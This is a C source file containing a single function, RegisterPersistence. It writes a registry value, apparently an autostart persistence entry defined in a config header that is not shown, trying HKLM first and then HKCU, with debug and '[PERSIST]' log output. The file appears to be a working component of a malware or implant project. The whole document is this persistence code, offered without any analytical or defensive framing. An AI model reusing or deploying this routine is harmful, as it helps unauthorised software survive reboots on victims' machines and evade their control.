#include "../include/config.h"

BOOL RegisterPersistence(void) {
    HKEY hKey;
    LONG ret;

    printf("[DEBUG] RegisterPersistence: Trying HKLM...\n");
    fflush(stdout);

    // Try HKLM first, fallback to HKCU
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, PERSIST_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
    {
        printf("[DEBUG] HKLM opened successfully\n");
        fflush(stdout);
        
        // Calculate the correct size for wide string
        size_t dataLen = (wcslen(PERSIST_VAL_DATA) + 1) * sizeof(wchar_t);
        
        ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
                            (LPBYTE)PERSIST_VAL_DATA, (DWORD)dataLen);
        
        printf("[DEBUG] RegSetValueExW result: %lu\n", ret);
        fflush(stdout);
        
        if (ret == ERROR_SUCCESS) {
            printf("[PERSIST] Wrote Registry Key (HKLM)...\n");
            fflush(stdout);
            RegCloseKey(hKey);
            return TRUE;
        }
        else {
            printf("[DEBUG] HKLM SetValue failed: %lu\n", ret);
        }
        
        RegCloseKey(hKey);
    }
    else {
        printf("[DEBUG] HKLM opened failed: %lu\n", GetLastError());
    }

    // Fallback to HKCU if HKLM fails
    printf("[DEBUG] Trying HKCU...\n");
    fflush(stdout);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, PERSIST_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
    {
        printf("[DEBUG] HKCU opened successfully\n");
        fflush(stdout);
        
        // Calculate the correct size for wide string
        size_t dataLen = (wcslen(PERSIST_VAL_DATA) + 1) * sizeof(wchar_t);
        
        ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
                            (LPBYTE)PERSIST_VAL_DATA, (DWORD)dataLen);
        
        printf("[DEBUG] HKCU RegSetValueExW result: %lu\n", ret);
        fflush(stdout);
        
        if (ret == ERROR_SUCCESS) {
            printf("[PERSIST] Wrote Registry Key (HKCU)...\n");
            fflush(stdout);
            RegCloseKey(hKey);
            return TRUE;
        }
        else {
            printf("[DEBUG] HKCU SetValue failed: %lu\n", ret);
        }
        
        RegCloseKey(hKey);
    }
    else {
        printf("[DEBUG] HKCU opened failed: %lu\n", GetLastError());
    }

    printf("[DEBUG] No registry key created\n");
    fflush(stdout);
    return FALSE;
}
